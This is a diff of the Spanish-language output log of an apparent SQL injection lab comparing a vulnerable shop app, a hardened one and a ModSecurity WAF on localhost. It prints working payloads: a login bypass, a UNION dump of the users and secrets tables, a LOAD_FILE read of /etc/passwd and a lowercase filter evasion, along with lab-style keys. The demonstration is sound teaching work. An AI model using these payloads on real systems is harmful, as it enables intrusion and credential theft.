@@ -1,46 +1,36 @@
 
 ========== 0) Salud de los servicios ==========
   http://localhost:3000        -> {"ok":true,"mode":"vulnerable"}
-  http://localhost:3002        -> {"ok":true,"mode":"vulnerable"}
   http://localhost:8080        -> {"ok":true,"mode":"vulnerable"}
   http://localhost:3001        -> {"ok":true,"mode":"secure"}
 
-========== 1) LOGIN BYPASS (vuln :3000) ==========
-  login admin' --   -> HTTP 302 (302=OK bypass)
-  panel -> FLAG{sqli_orm_mal_usado_=_rce_potencial}
-  login seguro (:3001) mismo payload -> HTTP 401 (401=rechazado)
+========== VULNERABILIDAD 1 - LOGIN: bypass de autenticacion (vuln :3000) ==========
+  POST /login  username=admin' --   -> HTTP 302 (302 = bypass OK)
+  acceso al panel admin -> FLAG{sqli_orm_mal_usado_=_rce_potencial}
+  mismo payload en la app SEGURA (:3001) -> HTTP 401 (401 = rechazado)
 
-========== 2) UNION-based: volcado de usuarios (vuln) ==========
-    usuario: admin
-    usuario: jlopez
-    usuario: mgarcia
-    usuario: svarela
+========== VULNERABILIDAD 2 - BUSCADOR: extraccion de datos por UNION (vuln :3000) ==========
+  Payload: ?q=zzz' UNION SELECT id,username,pass_plain,password_hash,role,email FROM users-- -
+    usuario extraido: admin
+    usuario extraido: jlopez
+    usuario extraido: mgarcia
+    usuario extraido: svarela
+  -- volcado de la tabla secrets:
+    secret: AKIA-LAB-7F3K9D2P
+    secret: replica_user:R3pl1c4-2024
+    secret: sk_test_51LabShopSecret0000
+    secret: FLAG{sqli_orm_mal_usado_=_rce_potencial}
 
-========== 3) Error-based (vuln): fuga de version MySQL ==========
-    XPATH syntax error: &#39;~8.0.46&#39;
+========== La app SEGURA (:3001) resiste el buscador ==========
+  mismo UNION contra :3001 -> 0 productos (0 = sin fuga, tratado como texto)
 
-========== 4) Time-based blind (vuln) ==========
-    baseline            : 0.010401s
-    UNION SELECT SLEEP(2): 2.006660s (debe ~2s)
+========== IMPACTO (privilegio FILE del usuario de BD) ==========
+    app_root  (vuln)  LOAD_FILE('/etc/passwd') len: 575
+    app_least (secure) LOAD_FILE('/etc/passwd')    : NULL (sin privilegio FILE)
 
-========== 5) ORDER BY / identifier injection (vuln) ==========
-    sort=price (ok)     : 12 cards
-    sort inyectado      : Table &#39;shopdb.nope&#39; doesn&#39;t exist
-
-========== 6) Impacto FILE: LOAD_FILE (privilegio del usuario de BD) ==========
-    app_root  /etc/passwd len: 575
-    app_least /etc/passwd    : NULL (sin FILE)
-
-========== 7) Filtro ingenuo (blacklist :3002) y evasion por tamper=lowercase ==========
-    'UNION SELECT' (MAYUS) -> HTTP 403 (403=bloqueado)
-    'union select' (minus) -> inyecta: admin
-
-========== 8) WAF ModSecurity/CRS (:8080) ==========
-    normal  /?q=teclado         -> HTTP 200
-    UNION SELECT                -> HTTP 403 (403)
-    union select (lowercase)    -> HTTP 403 (403, CRS normaliza)
-
-========== 9) Remediacion (:3001) resiste ==========
-    UNION SELECT -> 0 cards (0=sin fuga)
+========== WAF ModSecurity / OWASP CRS (:8080, delante de la vulnerable) ==========
+    normal  /?q=teclado           -> HTTP 200
+    UNION SELECT (buscador)       -> HTTP 403 (403 = bloqueado por CRS)
+    union select (minuscula)      -> HTTP 403 (403 = CRS normaliza)
 
 ========== FIN ==========
